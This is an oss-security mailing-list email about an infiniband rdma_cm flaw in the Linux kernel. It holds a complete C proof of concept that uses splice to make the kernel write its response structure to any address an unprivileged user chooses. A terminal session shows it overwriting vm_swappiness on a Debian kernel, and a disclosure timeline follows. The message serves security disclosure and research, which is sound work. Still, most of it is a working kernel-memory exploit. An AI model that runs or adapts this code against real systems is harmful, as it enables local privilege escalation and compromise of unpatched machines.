From: Jann Horn <jann-XZ1E9jl8jIdeoWH0uzbU5w@public.gmane.org>
Subject: Re: [oss-security] CVE Request: Linux: IB/security: Restrict use of
 the write() interface'
Date: Mon, 9 May 2016 20:02:08 +0200
Message-ID: <20160509180208.GB6372@pc.thejh.net>
References: <20160507042232.GA5286@eldamar.local>
 <1462645186.4268.27.camel@opteya.com>
Mime-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha1;
	protocol="application/pgp-signature"; boundary="pWyiEgJYm5f9v55/"
Return-path: <linux-rdma-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
Content-Disposition: inline
In-Reply-To: <1462645186.4268.27.camel-RlY5vtjFyJ3QT0dZR+AlfA@public.gmane.org>
Sender: linux-rdma-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
To: Yann Droneaud <ydroneaud-RlY5vtjFyJ3QT0dZR+AlfA@public.gmane.org>
Cc: Jason Gunthorpe <jgunthorpe-ePGOBjL8dl3ta4EC/59zMFaTQe2KTcn/@public.gmane.org>, Doug Ledford <dledford-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org>, linux-rdma-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
List-Id: linux-rdma@vger.kernel.org


--pWyiEgJYm5f9v55/
Content-Type: text/plain; charset=iso-8859-1
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

On Sat, May 07, 2016 at 08:19:46PM +0200, Yann Droneaud wrote:
> Hi,
>=20
> Le samedi 07 mai 2016 =E0 06:22 +0200, Salvatore Bonaccorso a =E9crit=A0:
> >=A0
> > Jann Horn reported an issue in the infiniband stack. It has been
> > fixed
> > in v4.6-rc6 with commit e6bd18f57aad1a2d1ef40e646d03ed0f2515c9e3:
> >=20
> > https://git.kernel.org/linus/e6bd18f57aad1a2d1ef40e646d03ed0f2515c9e3
> >=20
> > >=20
> > > IB/security: Restrict use of the write() interface
> > > The drivers/infiniband stack uses write() as a replacement for
> > > bi-directional ioctl().=A0=A0This is not safe. There are ways to
> > > trigger write calls that result in the return structure that
> > > is normally written to user space being shunted off to user
> > > specified kernel memory instead.
> > >=20
>=20
> That's an interesting issue.
>=20
> I thought access_ok() done as part of copy_to_user() would protect from
> such unwelcomed behavior. But it's not if the kernel invoke write()
> handler outside of a user process.
>=20
> Anyway, as I don't see yet how to reproduce the issue, is there a PoC
> available, I would be interested by a mean to trigger such write().

Here is my writeup of the issue that I made quite a while ago - the
timeline is missing some of the more recent stuff, but meh.

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D


Here is a PoC that can be used to clobber data at arbitrary
writable kernel addresses if the rdma_ucm module is loaded (without
actually needing Infiniband hardware to be present):

=3D=3D=3D=3D=3D
#define _GNU_SOURCE
#include <limits.h>
#include <errno.h>
#include <err.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <rdma/rdma_user_cm.h>

#define RDMA_PS_TCP 0x0106

// This method forces the kernel to write arbitrary data to the
// target fd under set_fs(KERNEL_DS), bypassing address limit
// checks in anything that extracts pointers from written data.
int write_without_addr_limit(int fd, char *buf, size_t len) {
  int pipefds[2];
  if (pipe(pipefds))
    return -1;
  ssize_t len_ =3D write(pipefds[1], buf, len);
  if (len =3D=3D -1)
    return -1;
  int res =3D splice(pipefds[0], NULL, fd, NULL, len_, 0);
  int errno_ =3D errno;
  close(pipefds[0]);
  close(pipefds[1]);
  errno =3D errno_;
  return res;
}

int clobber_kaddr(unsigned long kaddr) {
  // open infiniband fd
  int fd =3D open("/dev/infiniband/rdma_cm", O_RDWR);
  if (fd =3D=3D -1)
    err(1, "unable to open /dev/infiniband/rdma_cm - maybe the RDMA kernel =
module isn't loaded?");

  // craft malicious write buffer
  // structure:
  //   struct rdma_ucm_cmd_hdr hdr
  //   struct rdma_ucm_create_id cmd
  char buf[sizeof(struct rdma_ucm_cmd_hdr) + sizeof(struct rdma_ucm_create_=
id)];
  struct rdma_ucm_cmd_hdr *hdr =3D (void*)buf;
  struct rdma_ucm_create_id *cmd =3D (void*)(buf + sizeof(struct rdma_ucm_c=
md_hdr));
  hdr->cmd =3D RDMA_USER_CM_CMD_CREATE_ID;
  hdr->in =3D 0;
  hdr->out =3D sizeof(struct rdma_ucm_create_id_resp);
  cmd->ps =3D RDMA_PS_TCP;
  cmd->response =3D kaddr;

  int res =3D write_without_addr_limit(fd, buf, sizeof(buf));
  int errno_ =3D errno;
  close(fd);
  errno =3D errno_;
  return res;
}

int main(int argc, char **argv) {
  if (argc !=3D 2)
    errx(1, "want one argument (kernel address to clobber)");
  char *endp;
  unsigned long kaddr =3D strtoul(argv[1], &endp, 0);
  if (kaddr =3D=3D ULONG_MAX || *endp || endp =3D=3D argv[1])
    errx(1, "bad input number");

  int r =3D clobber_kaddr(kaddr);
  if (r >=3D 0) {
    printf("that probably worked? clobber_kaddr(0x%lx)=3D%d\n", kaddr, r);
    return 0;
  } else {
    printf("failed: %m\n");
    return 1;
  }
}
=3D=3D=3D=3D=3D

And here is an example that shows that this indeed works, tested
on a Debian distro kernel:

First, as root (warning: this will make the currently running system exploi=
table):
root@debian:~# modprobe rdma_ucm

Now, as attacker:
user@debian:~$ cat /proc/sys/vm/swappiness
60
user@debian:~$ ls -l /dev/infiniband/rdma_cm
crw-rw-rw- 1 root root 10, 59 Jan  9 23:07 /dev/infiniband/rdma_cm
user@debian:~$ gdb -q -ex 'print &vm_swappiness' -ex quit /usr/lib/debug/bo=
ot/vmlinux-$(uname -r)
Reading symbols from /usr/lib/debug/boot/vmlinux-3.16.0-4-amd64...done.
$1 =3D (int *) 0xffffffff81861760 <vm_swappiness>
user@debian:~$ gcc -Wall -std=3Dgnu99 -o infiniwrite infiniwrite.c
user@debian:~$ ./infiniwrite 0xffffffff81861760
that probably worked? clobber_kaddr(0xffffffff81861760)=3D32
user@debian:~$ cat /proc/sys/vm/swappiness
0

As you can see, the vm_swappiness variable in kernelspace was
overwritten by an unprivileged userspace process.

Timeline:
2015-09-11 initial report to security-DgEjT+Ai2ygdnm+yROfE0A@public.gmane.org and infiniband maintainers;
        exploitability isn't entirely clear to me yet
2015-09-11 infiniband maintainer responds, but apparently doesn't see an is=
sue
2015-12-26 I figure out the splice trick and ask the infiniband maintainers=
 to
        fix the issue
2015-12-26 Andy Lutomirski asks the infiniband maintainers to fix the issue=
 and
        break the ABI if necessary
2016-01-25 I send the PoC contained in this message to security-DgEjT+Ai2ygdnm+yROfE0A@public.gmane.org =
and
        the infiniband maintainers and ask them again to fix the issue.


--pWyiEgJYm5f9v55/
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: Digital signature

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBAgAGBQJXMNCgAAoJED4KNFJOeCOo4EIQAKffv0me0Yd4UAoloMOOWJpG
ct0jF0Xbr10+Jsc/jnY6bYb3svEHVXm/7zhLn848MIUfo11bufiABEysNkkoYa0m
CfRf0VBWVU4ZJ1+KFkR0gTIPsK9Q4386A+x+2TqTUB2kAkFTyQ9RF0ZbOiND0SHH
PA3gdYNYP5MRMvYRC3USo6iY/t1qvY7PLod6xgqSNtSYDP7FVzVPQ9KArtt2r20V
n2lZd4C9dOBsnqXqHrY6GEGWGabw5cl9C5bdEbOECC7+rVWn8tC1Fcy69yGsRKV1
4gCbb0jgkqpuuAxhCJWIPvDbGXgLimpPgTY4rz+3TErZnBUmOzmrp3kBexojcbp0
BtgBHgbmepYIDXvdDmg3EQLrW75hVaYQpDKP+K230eWdemjzBiorIIohJujqJCdE
xm2Mq4vpzUmrUdvlXEuDzKFTSnMxdGZn0k+a/cWNjROG4Q5vfTPAsvcZbC4AzPyd
mROGEflYHyyqpZFdJ89cAeWhXD9PEfjkPqE/6FV1PBwMkBcsg5/dvYYes0de/jBI
Nl1nZczt2XIvz/tVPlfNvzQ/QzSesJlF+fPsjecJcgeyaeygCrsGwxGztasu1V+J
+Zy+WorrKzdKmLpVcn+5YyTSWWciZyEnK/t8bBdHYp/KEc1/Vhkz47bM8uHht0ei
LZkg9WJ4RsaFzZ8hkTOq
=i8H8
-----END PGP SIGNATURE-----

--pWyiEgJYm5f9v55/--
--
To unsubscribe from this list: send the line "unsubscribe linux-rdma" in
the body of a message to majordomo-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
More majordomo info at  http://vger.kernel.org/majordomo-info.html
